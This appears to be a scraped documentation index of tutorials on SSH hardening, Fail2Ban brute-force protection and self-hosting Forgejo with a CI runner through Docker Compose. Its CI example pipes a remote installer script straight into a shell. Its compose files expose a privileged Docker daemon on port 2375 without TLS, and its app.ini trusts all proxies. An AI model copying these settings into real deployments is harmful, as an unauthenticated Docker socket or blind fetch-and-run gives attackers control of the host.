<p><code>bash    sudo chmod -R 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys</code></p> <p>This provides an extra layer of security by preventing other users from accessing the public key directory as well as the file itself. For more information on how this works, see our guide on how to modify file permissions.</p> <ol> <li>Now exit and log back in to your Compute Instance. In most cases, the first authentication method attempted will be public key authentication. If you\u2019ve successfully uploaded a public key for your user, you should be logged in without entering your user\u2019s password (though you will need to enter the passphrase for the SSH key).</li> </ol> <p>This should trigger If you specified a passphrase for your private key, you\u2019ll need to enter it.</p>"},{"location":"fail2ban/AdvancedSecOps/#ssh-daemon-options","title":"SSH Daemon Options","text":"<p>Lastly, edit the SSH configuration file to disallow root login and disable password authentication over SSH.</p> <ol> <li>Open the SSH configuration file on your Compute Instance using a Linux text editor, such as nano or vim:</li> </ol> <p><code>bash    sudo nano /etc/ssh/sshd_config</code></p> <ol> <li> <p>Disallow root logins over SSH. This requires all SSH connections be by non-root users. Once a limited user account is connected, administrative privileges are accessible either by using <code>sudo</code> or changing to a root shell using <code>su -</code>.</p> </li> <li> <p>File: /etc/ssh/sshd_config</p> <p><code>1 2 3 ``# Authentication: ... PermitRootLogin no</code></p> </li> <li> <p>Disable SSH password authentication. This requires all users connecting via SSH to use key authentication. Depending on the Linux distribution, the line <code>PasswordAuthentication</code> may need to be added, or uncommented by removing the leading <code>#</code>.</p> </li> <li> <p>File: /etc/ssh/sshd_config</p> <p><code>1 2 ``# Change to no to disable tunnelled clear text passwords PasswordAuthentication no</code></p> </li> </ol> <p>Note</p> <p>You may want to leave password authentication enabled if you connect to your Compute Instance from many different computers. This will allow you to authenticate with a password instead of generating and uploading a key-pair for every device.</p> <ol> <li>Listen on only one internet protocol. The SSH daemon listens for incoming connections over both IPv4 and IPv6 by default. Unless you need to SSH into your Compute Instance using both protocols, disable whichever you do not need. This does not disable the protocol system-wide, it is only for the SSH daemon. Depending on the Linux distribution, the line <code>AddressFamily</code> may need to be added, or uncommented by removing the leading <code>#</code></li> </ol> <p>Use the option:</p> <ul> <li><code>AddressFamily inet</code> to listen only on IPv4.</li> <li> <p><code>AddressFamily inet6</code> to listen only on IPv6.</p> </li> <li> <p>File: /etc/ssh/sshd_config</p> <p><code>1 2 ``# Port 22 AddressFamily inet</code></p> </li> <li> <p>Restart the SSH service to load the new configuration.</p> </li> <li> <p>If you\u2019re using a Linux distribution which uses systemd (CentOS 7, Debian 8, Fedora, Ubuntu 15.10+)</p> <p><code>bash  sudo systemctl restart sshd</code></p> </li> <li> <p>If your init system is SystemV or Upstart (CentOS 6, Debian 7, Ubuntu 14.04):</p> <p><code>bash  sudo service sshd restart</code></p> </li> </ul>"},{"location":"fail2ban/AdvancedSecOps/#use-fail2ban-for-ssh-login-protection","title":"Use Fail2Ban for SSH Login Protection","text":"<p>Fail2Ban is an application that bans IP addresses from logging into your server after too many failed login attempts. Since legitimate logins usually take no more than three tries to succeed (and with SSH keys, no more than one), a server being spammed with unsuccessful logins indicates attempted malicious access.</p> <p>Fail2Ban can monitor a variety of protocols including SSH, HTTP, and SMTP. By default, Fail2Ban monitors SSH only, and is a helpful security deterrent for any server since the SSH daemon is usually configured to run constantly and listen for connections from any remote IP address.</p> <p>For complete instructions on installing and configuring Fail2Ban, see our guide: A Tutorial for Using Fail2ban to Secure Your Server.</p>"},{"location":"fail2ban/AdvancedSecOps/#configure-a-firewall","title":"Configure a Firewall","text":"<p>Note</p> <p>Linode\u2019s free Cloud Firewall service can be used to replace or supplement internal firewall configuration. For more information on Cloud Firewalls, see our Getting Started with Cloud Firewalls guide. For help with solving general firewall issues, see the Troubleshooting Firewalls guide.</p> <p>Using a firewall to block unwanted inbound traffic to your Compute Instance provides a highly effective security layer. By being very specific about the traffic you allow in, you can prevent intrusions and network mapping. A best practice is to allow only the traffic you need, and deny everything else. See our documentation on some of the most common firewall applications:</p> <ul> <li>nftables or its predecessor, iptables, is the controller for netfilter, the Linux kernel\u2019s packet filtering framework. One of these utilities is included in most Linux distributions by default.</li> <li>firewalld is a firewall management tool that serves as a frontend to nftables or iptables. It is preinstalled on the RHEL family of distributions (and others), including CentOS, AlmaLinux, Rocky Linux, Fedora, and openSUSE Leap.</li> <li>UFW is another firewall management tool that operates as a frontend to nftables or iptables. It is used by default on Ubuntu and is also available on other Debian-based distributions.</li> </ul>"},{"location":"fail2ban/AdvancedSecOps/#common-lockout-recovery-steps","title":"Common Lockout Recovery Steps","text":"<p>If for whatever reason you find yourself locked out of your Compute Instance after putting your security controls into place, there are still a number of ways that you can regain access to your instance.</p> <ul> <li> <p>Access your Compute Instance through our out-of-band Lish console to regain access to the internals of your system without relying on SSH.</p> </li> <li> <p>If you need to re-enable password authentication and/or root login over ssh to your instance, you can do this by reversing the following sections of this file to reflect these changes</p> </li> <li> <p>File: /etc/ssh/sshd_config</p> <p><code>1 2 3 4 5 ``# Authentication: ... PermitRootLogin yes ... PasswordAuthentication yes</code></p> </li> </ul> <p>From there, you just need to restart SSH.</p> <p>If you\u2019re using a Linux distribution which uses systemd (CentOS 7, Debian 8, Fedora, Ubuntu 15.10+)</p> <p><code>bash   sudo systemctl restart sshd</code></p> <p>If your init system is SystemV or Upstart (CentOS 6, Debian 7, Ubuntu 14.04):</p> <p><code>bash   sudo service sshd restart</code></p> <ul> <li>If you need to remove your public key from your Compute Instance, you can enter the following command:</li> </ul> <p><code>bash   rm ~/.ssh/authorized_keys</code></p> <p>You can then replace your key by re-following the Create an Authentication Key-pair section of this guide.</p>"},{"location":"fail2ban/Install/","title":"Using Fail2Ban for SSH Brute-force Protection","text":"<p>Fail2Ban is an intrusion prevention framework written in Python that protects Linux systems and servers from brute-force attacks. You can setup </p> <p>Fail2Ban to provide brute-force protection for SSH on your server. This ensures that your server is secure from brute-force attacks. It also allows you to monitor the strength of the attacks in regards to the number of authentication attempts that are being made.</p> <p>Brute-force attacks can be extremely powerful and may result in thousands of failed authentication attempts per day. It is therefore vital to understand how to protect your server from these attacks and how to block IP addresses. Fail2Ban allows you to automate the process of blocking brute-force attacks by limiting the number of failed authentication attempts a user can make before being blocked. This is extremely useful for servers that have user accounts that utilize passwords for remote authentication as opposed to SSH key-pair authentication.</p>"},{"location":"fail2ban/Install/#before-you-begin","title":"Before You Begin","text":"<p>Note</p> <p>This guide uses Ubuntu, but the commands are similar for other systems.</p> <ol> <li> <p>Complete the Getting Started guide.</p> </li> <li> <p>Follow the Setting Up and Securing a Compute Instance guide to create a standard user account, and harden SSH access, but do not create a basic firewall.</p> </li> <li> <p>Log into your Linode via SSH and update and upgrade.</p> </li> </ol> <p><code>sudo apt update &amp;&amp; sudo apt upgrade</code></p> <p>Note</p> <p>This guide is written for a non-root user. Commands that require elevated privileges are prefixed with <code>sudo</code>. If you\u2019re not familiar with the <code>sudo</code> command, see our Users and Groups guide.</p>"},{"location":"fail2ban/Install/#installing-and-configuring-fail2ban","title":"Installing And Configuring Fail2Ban","text":"<p>Fail2Ban is free to use and can be installed through most of the popular package managers.</p> <ol> <li>Install Fail2Ban by running the following command:</li> </ol> <p><code>sudo apt-get install fail2ban</code></p> <ol> <li>To ensure that Fail2ban runs on system startup, use the following command:</li> </ol> <p><code>sudo systemctl enable fail2ban.service</code></p> <p>After the installation is complete, you can begin configuring Fail2Ban to set up a jail for your SSH server. The Fail2Ban configuration files are located in the <code>/etc/fail2ban</code> directory, as shown in the output below.</p> <pre><code>/etc/fail2ban$ ls -alps\ntotal 68\n 4 drwxr-xr-x  6 root root  4096 Oct 12 18:21 ./\n 4 drwxr-xr-x 94 root root  4096 Oct 12 18:21 ../\n 4 drwxr-xr-x  2 root root  4096 Oct 12 18:21 action.d/\n 4 -rw-r--r--  1 root root  2334 Jan 18  2018 fail2ban.conf\n 4 drwxr-xr-x  2 root root  4096 Apr  4  2018 fail2ban.d/\n 4 drwxr-xr-x  3 root root  4096 Oct 12 18:21 filter.d/\n24 -rw-r--r--  1 root root 22897 Jan 18  2018 jail.conf\n 4 drwxr-xr-x  2 root root  4096 Oct 12 18:21 jail.d/\n 4 -rw-r--r--  1 root root   645 Jan 18  2018 paths-arch.conf\n 4 -rw-r--r--  1 root root  2827 Jan 18  2018 paths-common.conf\n 4 -rw-r--r--  1 root root   573 Jan 18  2018 paths-debian.conf\n 4 -rw-r--r--  1 root root   738 Jan 18  2018 paths-opensuse.conf\n</code></pre> <p>Fail2Ban uses the default configuration in the <code>jail.conf</code> file. However, it is not recommended to use the default configuration files as they can be overwritten by newer updates to the Fail2Ban package. The preferred approach to creating configurations for a particular service is by creating a new configuration file in the <code>/etc/fail2ban</code> directory with the <code>.local</code> extension.</p> <p>Note</p> <p>A Fail2ban jail is a configuration file that contains filters or arguments that protect your system or a particular service</p>"},{"location":"fail2ban/Install/#creating-ssh-jails-with-fail2ban","title":"Creating SSH Jails With Fail2Ban","text":"<ol> <li>Begin by creating a new file within the same directory called <code>jail.local</code>. You can then add the necessary security configurations for the sshd jail.</li> </ol> <p><code>sudo nano /etc/fail2ban/jail.local</code></p> <ol> <li>You can explore the options that Fail2Ban provides to customize the security and blocking of the SSH service.</li> </ol> <p>Fail2Ban Configuration Options:</p> Configurations Function enabled Jail status (true/false) - This enables or disables the jail port Port specification filter Service specific filter (Log filter) logpath What log to use maxretry Number of attempts to make before a ban findtime Amount of time between failed login attempts bantime Number of seconds an IP is banned for ignoreip IP to be allowed <ol> <li>With the information in table above you can create the <code>jail.local</code> configuration for OpenSSH server (sshd). Once you have entered the configuration options, the values used in this guide example are listed in the sample file below.</li> </ol> <p>Note</p> <p>You can customize the Fail2Ban configuration options and values as per your security requirements.</p> <ul> <li> <p>File: /etc/fail2ban/jail.local</p> <p><code>1 2 3 4 5 6 7 8 9 ``[sshd] enabled = true port = ssh filter = sshd logpath = /var/log/auth.log maxretry = 3 findtime = 300 bantime = 3600 ignoreip = 127.0.0.1</code></p> </li> </ul> <p>Note</p> <p>You can disable a Fail2Ban jail by setting the enabled configuration to false</p> <ol> <li>After you have specified the configuration options and their respective values, save the file and restart the Fail2Ban service with the following command:</li> </ol> <p><code>sudo systemctl restart fail2ban.service</code></p> <ol> <li> <p>After restarting the OpenSSH server service, Fail2Ban uses this new configuration and the jail for the sshd service is activated and runs.</p> </li> <li> <p>You can now test this functionality by re-enabling <code>PasswordAuthentication</code> in the OpenSSH Configuration file found in <code>/etc/ssh/sshd_config</code>. Do this by changing the value from <code>no</code> to <code>yes</code> using the text editor of your choice. Make sure these lines are uncommented.</p> </li> <li> <p>File: /etc/ssh/sshd_config</p> <p><code>1 2 3 ``#To disable tunneled clear text passwords, change to no here! PasswordAuthentication yes PermitEmptyPasswords no</code></p> </li> </ol> <p>This allows users to use passwords for authentication in addition to SSH key-pairs. Fail2Ban automatically detects brute-force attempts on SSH and blocks the users automatically. This greatly improves the security of both password based authentication and the server and is useful for user accounts that do not have administrator privileges.</p>"},{"location":"fail2ban/Install/#testing-fail2ban","title":"Testing Fail2Ban","text":"<ol> <li> <p>To test this, create a new user account, let\u2019s call it <code>dev</code>.</p> </li> <li> <p>Attempt to log into the <code>dev</code> account with an incorrect password three times.</p> </li> <li> <p>After three failed attempts you are blocked from authentication for an hour.</p> </li> </ol> <p><code>ssh dev@192.168.1.107    dev@192.168.1.107's password:    Permission denied, please try again.    dev@192.168.1.107's password:    Permission denied, please try again.    dev@192.168.1.107's password:    dev@192.168.1.107: Permission denied (publickey,password).    ssh dev@192.168.1.107    dev@192.168.1.107's password:    Permission denied, please try again.    dev@192.168.1.107's password:    Connection closed by 192.168.1.107 port 22    sh dev@192.168.1.107    ssh: connect to host 192.168.1.107 port 22: Connection refused</code></p> <p>As you can see in the output above, after three consecutive failed attempts, Fail2Ban actively blocks the SSH connection. After three consecutive failed attempts the connection times out and the user is blocked for the specified time. If you try connecting again within the blocked period, you get a \u201cConnection refused\u201d error and are not able to establish an SSH connection to the server.</p> <p>This demonstrates the power and robust nature of Fail2Ban and how it can be used to create elegant and effective firewalls for services like SSH. You can customize your service jails to meet your security requirements and easily implement new configuration options.</p> <ol> <li>After implementing and testing Fail2Ban you can now take a look at how to monitor and analyze the various failed authentication attempts and blocked IP\u2019s with the Fail2Ban-client.</li> </ol>"},{"location":"fail2ban/Install/#monitoring-with-fail2ban-client","title":"Monitoring With Fail2Ban-Client","text":"<p>One of Fail2Ban\u2019s greatest advantages is that it allows you to actively monitor all the failed authentication attempts and the various IP addresses that have been blocked. This information helps you understand the scale of attacks you are facing and the geolocation of the attacks by analyzing the origins of the IP addresses.</p> <ol> <li>You can use the Fail2Ban-client tool to check the status of Fail2Ban and the active jails. This can be done by running the following command:</li> </ol> <p><code>sudo fail2ban-client status</code></p> <p><code>Status    |- Number of jail:   1    `- Jail list:    sshd</code></p> <p>As shown in the output above, the active jail list is displayed with the names of the respective jails. In the case above you can see that the sshd jail is active.</p> <ol> <li>To view the status and information regarding a particular jail like sshd, you can use the following command:</li> </ol> <p><code>sudo fail2ban-client status sshd</code></p> <p><code>Status for the jail: sshd    |- Filter    |  |- Currently failed:  1    |  |- Total failed:  4    |  `- File list: /var/log/auth.log    `- Actions       |- Currently banned:  1       |- Total banned:  1       `- Banned IP list:    192.168.1.101</code></p> <p>The output above shows you the status and information regarding the sshd jail. You can see that you have four total failed authentication attempts and one banned IP address. This is helpful as it can alert you to potential targeted attacks.</p> <p>You have successfully been able to set up, implement, test, and analyze Fail2Ban for brute-force protection. You have completed setting up your remote authentication security.</p>"},{"location":"fail2ban/Install/#next-steps","title":"Next Steps","text":"<p>For more detailed information on Fail2Ban, including setting up email alerts and writing regular expressions to filter and parse log files, see the Using Fail2ban to Secure Your Server - A Tutorial guide.</p> <p>This page was originally published on October 13, 2020.</p>"},{"location":"forgejo/docker-compose/","title":"Docker compose","text":"<p>setup.sh</p> <pre><code>#!/usr/bin/env bash\n\nset -e\n\nmkdir -p data\ntouch data/.runner\nmkdir -p data/.cache\n\nchown -R 1001:1001 data/.runner\nchown -R 1001:1001 data/.cache\nchmod 775 data/.runner\nchmod 775 data/.cache\nchmod g+s data/.runner\nchmod g+s data/.cache\n</code></pre> <p>docker-compose.yml</p> <pre><code>version: '3'\n\nnetworks:\n  forgejo:\n    external: false\n\nservices:\n  forgejo:\n    image: codeberg.org/forgejo/forgejo:7\n    container_name: forgejo\n    networks:\n      - forgejo\n    environment:\n      - USER_UID=1000\n      - USER_GID=1000\n    restart: always\n    volumes:\n      - ./forgejo:/data\n      - /etc/timezone:/etc/timezone:ro\n      - /etc/localtime:/etc/localtime:ro\n    ports:\n      - '3000:3000'\n      - '222:22'\n  docker-in-docker:\n    image: docker:dind\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    networks:\n      - forgejo\n    container_name: 'docker_dind'\n    privileged: 'true'\n    command: ['dockerd', '-H', 'tcp://0.0.0.0:2375', '--tls=false']\n    restart: 'unless-stopped'\n\n  runner:\n    image: 'code.forgejo.org/forgejo/runner:3.4.1'\n    links:\n      - docker-in-docker\n    depends_on:\n      docker-in-docker:\n        condition: service_started\n    networks:\n      - forgejo\n    container_name: 'runner'\n    environment:\n      DOCKER_HOST: tcp://docker-in-docker:2375\n    # User without root privileges, but with access to `./data`.\n    user: 1001:1001\n    volumes:\n      - ./data:/data\n      - /var/run/docker.sock:/var/run/docker.sock\n    restart: 'unless-stopped'\n    command: '/bin/sh -c \"while : ; do sleep 1 ; done ;\"'\n    # command: '/bin/sh -c \"sleep 5; forgejo-runner daemon\"'\n</code></pre> <pre><code>docker exec -it --user=root runner /bin/bash\napk add docker\n</code></pre> <pre><code>docker exec -it runner /bin/bash\n</code></pre> <pre><code>forgejo-runner register\nor\nforgejo-runner register --no-interactive --token {TOKEN} --name runner --instance https://next.forgejo.org\nubuntu-22.04:docker://ghcr.io/catthehacker/ubuntu:act-22.04\nubuntu-latest:docker://ghcr.io/catthehacker/ubuntu:act-22.04\n</code></pre> <pre><code>command: '/bin/sh -c \"sleep 5; forgejo-runner daemon\"'\n</code></pre>"},{"location":"forgejo/docker-compose/#only-runner","title":"Only Runner","text":"<pre><code>version: '3.8'\n\nnetworks:\n  forgejo:\n    driver: bridge\n    ipam:\n     config:\n       - subnet: 10.5.0.0/16\n         gateway: 10.5.0.1\nservices:\n  docker-in-docker:\n    image: docker:dind\n    container_name: 'docker_dind'\n    privileged: true\n    command: [ \"dockerd\", \"-H\", \"tcp://0.0.0.0:2375\", \"--tls=false\" ]\n    restart: 'unless-stopped'\n    networks:\n      forgejo:\n        ipv4_address: 10.5.0.2\n\n  gitea:\n    image: 'code.forgejo.org/forgejo/runner:3.3.0'\n    links:\n      - docker-in-docker\n    depends_on:\n      docker-in-docker:\n        condition: service_started\n    container_name: 'runner'\n    environment:\n      DOCKER_HOST: tcp://docker-in-docker:2375\n    # A user without root privileges, but with access to `./data`.\n    user: 1001:1001\n    volumes:\n      - ./data:/data\n    restart: 'unless-stopped'\n    networks:\n      forgejo:\n        ipv4_address: 10.5.0.3\n    command: '/bin/sh -c \"sleep 5; forgejo-runner daemon\"'\n</code></pre>"},{"location":"forgejo/docker-compose/#example-action","title":"Example Action","text":"<pre><code>name: build\n\non:\n  workflow_dispatch:\n  push:\n    branches:\n      - 'main'\n\n\njobs:\n  docker:\n    runs-on: ubuntu-22.04\n    env:\n      DOCKER_HOST: tcp://172.18.0.3:2375\n    steps:\n      -\n        name: find ip\n        run: |\n          docker ps\n          docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' docker_dind          \n      -\n        name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      -\n        name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n      -\n        name: Login to Docker Hub\n        uses: docker/login-action@v3\n        with:\n          registry: forgejo.madolell.com\n          username: ${{ secrets.DOCKER_USER }}\n          password: ${{ secrets.DOCKER_TOKEN }}\n      - \n        name: Pull repository\n        uses: actions/checkout@v4\n      -\n        name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: forgejo.madolell.com/rafa/test:latest\n</code></pre>"},{"location":"forgejo/docs/","title":"Docs","text":"<p>HUIJZER.XYZ</p> <p>About Blog </p>"},{"location":"forgejo/docs/#installing-forgejo-with-a-separate-runner","title":"Installing Forgejo with a separate runner","text":"<p>2024-03-08</p> <p>On the 15th of February 2024, Forgejo annouced that they will be decoupling (hard forking) their project further from Gitea. I think this is great since Forgejo is the only European Git forge that I know of, and a hard fork means that the project can now grow more independently. With Forgejo, it is now possible to self-host host a forge on a European cloud provider like Hetzner. This is great because it allows decoupling a bit from American Big Tech. Put differently, a self-hosted Forgejo avoids having all your eggs in one basket.</p> <p>This post will go through a full step by step guide on how to set things up. This guide is based on my Gitea configuration that I ran for a year, so it works. During the year, I paid about 10 euros per month for two Hetzner servers. The two servers allow separating Forgejo from the runners. This ensures that a heavy job on the runner will not slow down the Forgejo server.</p>"},{"location":"forgejo/docs/#creating-a-server","title":"Creating a server","text":"<p>On Hetzner, I went for the second cheapest x86 server with 2 VCPU, 2 GB RAM, and 40 GB SSD. This server responds much quicker to Git pushes than the cheapest 1 VCPU setting. The OS is set to Ubuntu 22.04. With backups and a IPv4 address, this costs \u20ac6.20 per month. For the firewall, ensure that TCP ports 22, 443, and 80 are open. For the server name, I would advice to give it a name that is easy to remember. In my case, I called it <code>arnold</code>.</p> <p>Unfortunately, I do not pick the ARM server here. Even if Forgejo works with ARM (I'm not sure but it could be), then having an ARM will be restrictive. It's very cumbersome to have a full Forgejo instance running only to find out that some part doesn't work. Or, that it is not possible to co-host another service next to it. Maybe I'll switch later.</p> <p>So, after the server called <code>arnold</code> is created, let's add it to our local SSH config at <code>~/.ssh/config</code>:</p> <pre><code>Host arnold\n    HostName &lt;IP ADDRESS&gt;\n    User root\n    IdentityFile ~/.ssh/hetzner\n</code></pre> <p>Now, we can connect to the server with <code>ssh arnold</code>. As always with any new server, start with:</p> <pre><code>sudo apt update\n\nsudo apt upgrade\n\nsudo reboot\n</code></pre> <p>Next, because we're going to use Docker Compose, install Docker via their apt repository. And ensure that it works by running:</p> <pre><code>docker run hello-world\n</code></pre>"},{"location":"forgejo/docs/#caddy","title":"Caddy","text":"<p>Next, note that want to make our Forgejo server available to the outside world. This requires certificates so that a secure connection can be established. We'll use Caddy with Let's Encrypt to do this. By using Caddy as a reverse proxy, we will get HTTPS and can also use it to add extra services to the server later if we want.</p> <p>Before we start Caddy, we need to make our server available on some domain. Assuming you have some domain, say <code>example.com</code> available, add the following A and AAAA records:</p> <pre><code>A git &lt;IP ADDRESS&gt;\nAAAA git &lt;IPv6 ADDRESS&gt;\n</code></pre> <p>With a reasonably low TTL of say 15 minutes. By default, the TTL is often much higher which means that you need to wait for hours if you make a mistake. Now, <code>git.example.com</code> will point to our server. I will call this <code>&lt;DOMAIN&gt;</code> from here onward in this tutorial.</p> <p>Now we can configure Caddy. Add a new directory on your server called <code>caddy</code> and put the following in <code>Caddyfile</code>:</p> <pre><code>{\n  email &lt;YOUR EMAIL ADDRESS&gt;\n  admin off\n}\n\n&lt;DOMAIN&gt; {\n  reverse_proxy 127.0.0.1:3000\n}\n</code></pre> <p>Also add a <code>docker-compose.yml</code> file:</p> <pre><code>version: \"3.7\"\n\nservices:\n  caddy:\n    image: \"caddy:2.7.6-alpine\"\n    network_mode: \"host\"\n    container_name: \"caddy\"\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n        max-file: \"10\"\n    volumes:\n      - \"./Caddyfile:/Caddyfile:ro\"\n      # This allows Caddy to cache the certificates.\n      - \"/data/caddy:/data:rw\"\n    command: \"caddy run --config /Caddyfile --adapter caddyfile\"\n    restart: \"unless-stopped\"\n</code></pre> <p>The logging limits ensure that the logs will not grow infinitely. I've been there. Having to recover a server which ran out of disk space is not fun.</p> <p>Now Caddy can be started with:</p> <pre><code>docker compose up\n</code></pre> <p>and the server should be available in the browser at the URL <code>https://&lt;DOMAIN&gt;</code>. It should show an empty page with status 502 Bad Gateway. This 502 is because we told Caddy that it should resolve to port 3000, but there is nothing there yet! All is good at this point, press CTRL + C to stop Caddy and start it again with:</p> <pre><code>docker compose up -d\n</code></pre> <p>Now the Caddy service should remain online even after you close the terminal. Thanks to <code>restart: \"unless-stopped\"</code>, the Caddy service will also automatically restart after a server reboot.</p>"},{"location":"forgejo/docs/#forgejo","title":"Forgejo","text":"<p>Go back to the main directory and make a new directory called <code>forgejo</code>. Step into <code>forgejo/</code> and add a file called <code>app.ini</code>:</p> <pre><code>APP_NAME = git\nRUN_USER = git\nRUN_MODE = prod\nWORK_PATH = /var/lib/forge\n\n[server]\nSSH_DOMAIN = localhost\nHTTP_PORT = 3000\nROOT_URL = https://&lt;DOMAIN&gt;\nDISABLE_SSH = true\n; In rootless gitea container only internal ssh server is supported\nSTART_SSH_SERVER = true\nSSH_PORT = 2222\nSSH_LISTEN_PORT = 2222\nBUILTIN_SSH_SERVER_USER = git\n\n[database]\nDB_TYPE = sqlite3\nHOST = localhost:3306\nNAME = forge\nUSER = root\nPASSWD = \n\n[security]\nINSTALL_LOCK = true\nREVERSE_PROXY_LIMIT = 1\nREVERSE_PROXY_TRUSTED_PROXIES = *\n\n[service]\nDISABLE_REGISTRATION = true\nREQUIRE_SIGNIN_VIEW = false\n\n[actions]\nENABLED = true\nDEFAULT_ACTIONS_URL = https://github.com\n</code></pre> <p>These are some values that I picked, but feel free to tweak them. This assumes that you want a personal Git forge which doesn't allow other people to register on it.</p> <p>Also, I've set the <code>DEFAULT_ACTIONS_URL</code> to GitHub in order to have Forgejo be more of a drop-in replacement for the GitHub Actions. This works very well if also specifying the right runner label, see below.</p> <p>Change <code>&lt;DOMAIN&gt;</code> to your git server's domain name. Next, add a file called <code>setup.sh</code>:</p> <pre><code>set -e\n\nmkdir -p work\nmkdir -p work/data\n\nchown -R 1000:1000 work/data\nchmod 775 work/data\nchmod g+s work/data\n\nchown 1000:1000 app.ini\nchmod 775 app.ini\nchmod g+s app.ini\n</code></pre> <p>This will setup the rootless work directory that Forgejo will use. Run this file with</p> <pre><code>bash setup.sh\n</code></pre> <p>Finally, add <code>docker-compose.yml</code>:</p> <pre><code>version: '3'\n\nnetworks:\n  forgejo:\n    external: false\n\nservices:\n  gitea:\n    image: 'codeberg.org/forgejo/forgejo:1.21-rootless'\n    container_name: 'forgejo'\n    environment:\n      USER_UID: '1000'\n      USER_GID: '1000'\n      FORGEJO_WORK_DIR: '/var/lib/forge'\n    user: '1000:1000'\n    networks:\n      - forgejo\n    ports:\n      - '3000:3000'\n      - '222:22'\n    volumes:\n      - './app.ini:/etc/gitea/app.ini'\n      - './data:/data:rw'\n      - '/etc/timezone:/etc/timezone:ro'\n      - '/etc/localtime:/etc/localtime:ro'\n      # Depends on `FORGEJO_WORK_DIR`.\n      - './work:/var/lib/forge:rw'\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n        max-file: \"10\"\n    restart: 'unless-stopped'\n</code></pre> <p>and start this with <code>docker-compose up</code>.</p> <p>While this is running, open another terminal to add an admin user. First, step into the running container:</p> <pre><code>docker exec -it forgejo /bin/bash\n</code></pre> <p>and then add an admin user:</p> <pre><code>forgejo admin user create --username &lt;USERNAME&gt; --password &lt;PASSWORD&gt; --email &lt;EMAIL&gt; --admin\n</code></pre> <p>Now Forgejo should be up and running at <code>https://&lt;DOMAIN&gt;</code> and signing in should work with the newly created admin account. If there are errors, try restarting the server with <code>reboot now</code>. With that, both Caddy and Forgejo restart which might solve the problem.</p>"},{"location":"forgejo/docs/#forgejo-runner","title":"Forgejo runner","text":"<p>Having a forge is one thing, but in my opinion a CI runner is also a must have. For that, we setup another Hetzner server and install the Forgejo runner on that. Also here, I advice to take a x86 server as ARM will likely give problems. Set the server up in the same way as before and SSH into it again. This time, I called the server <code>runner</code> and ssh into it with <code>ssh runner</code>.</p> <p>Run <code>update</code> and <code>upgrade</code>, and install Docker and reboot, like before.</p> <p>Next, create <code>setup.sh</code>:</p> <pre><code>#!/usr/bin/env bash\n\nset -e\n\nmkdir -p data\ntouch data/.runner\nmkdir -p data/.cache\n\nchown -R 1001:1001 data/.runner\nchown -R 1001:1001 data/.cache\nchmod 775 data/.runner\nchmod 775 data/.cache\nchmod g+s data/.runner\nchmod g+s data/.cache\n</code></pre> <p>and run with</p> <pre><code>bash setup.sh\n</code></pre> <p>Then create <code>docker-compose.yml</code> with:</p> <pre><code>version: '3.8'\n\nservices:\n  docker-in-docker:\n    image: docker:dind\n    container_name: 'docker_dind'\n    privileged: true\n    command: [ \"dockerd\", \"-H\", \"tcp://0.0.0.0:2375\", \"--tls=false\" ]\n    restart: 'unless-stopped'\n\n  gitea:\n    image: 'code.forgejo.org/forgejo/runner:3.3.0'\n    links:\n      - docker-in-docker\n    depends_on:\n      docker-in-docker:\n        condition: service_started\n    container_name: 'runner'\n    environment:\n      DOCKER_HOST: tcp://docker-in-docker:2375\n    # A user without root privileges, but with access to `./data`.\n    user: 1001:1001\n    volumes:\n      - ./data:/data\n    restart: 'unless-stopped'\n\n    command: '/bin/sh -c \"while : ; do sleep 1 ; done ;\"'\n</code></pre> <p>This <code>command</code> doesn't start the runner yet, we first register it with the server. To do so, run:</p> <pre><code>docker compose up\n</code></pre> <p>And in another terminal, run:</p> <pre><code>docker exec -it runner /bin/bash\n</code></pre> <p>And</p> <pre><code>forgejo-runner register\n</code></pre> <p>with instance URL: <code>https://&lt;DOMAIN&gt;</code>.</p> <p>For the runner token, browse to the following URL:</p> <pre><code>https://&lt;DOMAIN&gt;/user/settings/actions/runners\n</code></pre> <p>to get it.</p> <p>For the runner name, I used <code>hetzner_runner</code>.</p> <p>Then for the labels, and this is very important, use:</p> <pre><code>ubuntu-22.04:docker://ghcr.io/catthehacker/ubuntu:act-22.04\n</code></pre> <p>This label specifies to which workflows the runner will respond. In this case, it will respond to <code>ubuntu-22.04</code> workflows with a <code>ghcr.io/catthehacker/ubuntu:act-22.04</code> container. This is a 1.2 GB container with a lot of pre-installed software. It's not as feature-full as the GitHub runners, but those are about 20 GB in size, so this is a good compromise. See <code>nektos/act</code> for more information about the available containers.</p> <p>The runner should now be visible at</p> <pre><code>https://&lt;DOMAIN&gt;/user/settings/actions/runners\n</code></pre> <p>with the status <code>Offline</code>.</p> <p>To fix that, exit the Docker Compose by pressing CTRL+C a few times and modify the <code>command</code> to</p> <pre><code>command: '/bin/sh -c \"sleep 5; forgejo-runner daemon\"'\n</code></pre> <p>The sleep here provides the <code>docker-in-docker</code> service with some extra time to get started. Run <code>docker compose up -d</code> to start the runner in the background.</p> <p>The runner should now be visible at</p> <pre><code>https://&lt;DOMAIN&gt;/user/settings/actions/runners\n</code></pre> <p>with the status <code>Idle</code>.</p>"},{"location":"forgejo/docs/#testing","title":"Testing","text":"<p>Finally, let's test whether the runner works. To do so, create a new repository via the web interface. In the new repository enable repository Actions at</p> <pre><code>https://&lt;DOMAIN&gt;/&lt;USERNAME&gt;/&lt;REPO&gt;/settings\n</code></pre> <p>and click \"Update Settings\".</p> <p>Then, either via the web interface or via cloning the repository and working there, create the following files.</p> <p><code>.github/workflows/ci.yml</code>:</p> <pre><code>name: ci\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n  workflow_dispatch:\n\njobs:\n  test:\n    runs-on: ubuntu-22.04\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y\n          source \"$HOME/.cargo/env\"\n          echo \"$PATH\" &gt;&gt; $GITHUB_PATH\n      - run: |\n          rustup update stable\n          rustup default stable\n      - name: Cache\n        uses: Swatinem/rust-cache@v2\n        with:\n          prefix-key: 'rust'\n      - run: rustc hello.rs\n      - run: ./hello\n</code></pre> <p><code>hello.rs</code>:</p> <pre><code>fn 